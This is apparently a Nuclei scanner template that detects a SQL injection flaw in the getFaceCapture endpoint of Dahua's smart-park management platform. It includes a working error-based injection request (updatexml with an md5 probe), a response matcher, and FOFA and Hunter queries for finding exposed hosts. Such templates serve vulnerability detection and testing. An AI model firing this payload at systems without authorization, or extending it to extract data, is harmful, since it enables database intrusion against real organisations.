id: dahua-WPMS-SQL

info:
  name: dahua-WPMS-SQL
  author: hufei
  severity: high
  description: |
    大华 智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息
  reference:
    https://github.com/PeiQi0/PeiQi-WIKI-Book/tree/main/docs/wiki/iot/%E5%A4%A7%E5%8D%8E
  metadata:
    max-request: 1
    fofa-query: app="dahua-智慧园区综合管理平台"
    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
    verified: true
  tags: 2023,HVV,dahua,SQL

requests:
  - method: GET
    path:
      - "{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D"
    matchers:
      - type: word
        words:
          - "1e469dbcb9211897b5f5ebf866c66f3"